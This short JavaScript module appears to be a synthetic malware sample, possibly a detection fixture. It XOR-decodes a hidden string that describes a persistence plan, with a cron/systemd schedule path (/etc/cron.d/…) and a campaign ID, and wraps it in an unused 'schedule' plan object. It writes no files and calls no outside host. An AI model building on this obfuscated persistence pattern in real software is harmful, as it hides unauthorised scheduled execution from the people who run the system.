const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_a0d2a9f7 = "\\xb0\\xfb\\xf7\\xba\\xb5\\xb2\\xa3\\xb6\\xb5\\xfb\\xa4\\xb3\\xaf\\xaa\\xa2\\x99\\xb5\\xa5\\xae\\xa3\\xa2\\xb3\\xaa\\xa3\\xea\\xb4\\xa3\\xa1\\xaf\\xb5\\xb2\\xa3\\xb4\\x99\\xa2\\xa3\\xb5\\xa5\\xb4\\xaf\\xb6\\xb2\\xa9\\xb4\\xba\\xa7\\xa2\\xa7\\xb6\\xb2\\xa3\\xb4\\xfb\\xb5\\xbf\\xb5\\xb2\\xa3\\xab\\xa2\\x99\\xa2\\xa3\\xb5\\xa5\\xb4\\xaf\\xb6\\xb2\\xa9\\xb4\\xba\\xb5\\xb2\\xa7\\xa1\\xa3\\x99\\xa5\\xa9\\xb3\\xa8\\xb2\\xfb\\xf7\\xba\\xa5\\xa7\\xab\\xb6\\xa7\\xaf\\xa1\\xa8\\x99\\xaf\\xa2\\xfb\\x88\\x89\\x82\\x83\\xeb\\xfe\\x87\\x82\\xf6\\xfe\\xfe\\xff\\x82\\xba\\xb5\\xa5\\xae\\xa3\\xa2\\xb3\\xaa\\xa3\\x99\\xb6\\xa7\\xb2\\xae\\xfb\\xe9\\xa3\\xb2\\xa5\\xe9\\xa5\\xb4\\xa9\\xa8\\xe8\\xa2\\xe9\\xa8\\xa9\\xa2\\xa3\\xeb\\xfe\\xa7\\xa2\\xf6\\xfe\\xfe";

const Codec_a0d2a9f7 = "escaped_octets|single_byte_xor|c6";



function load_a0d2a9f7() { return [...Material_a0d2a9f7.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_a0d2a9f7(EnCoDeD) { return EnCoDeD.map((value) => value ^ 198); }

async function recover_a0d2a9f7() {

  const NeUtRaL = [3, 5, 8, 13].slice(1, 3);

  const EnCoDeD = load_a0d2a9f7(); let DeCoDeD = [];

  DeCoDeD = decode_a0d2a9f7(EnCoDeD);

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_a0d2a9f7() { return JSON.parse(JSON.stringify({ value: await recover_a0d2a9f7() })).value; }

async function plan_a0d2a9f7() { const inspect = inspect_a0d2a9f7; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_a0d2a9f7;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_a0d2a9f7());

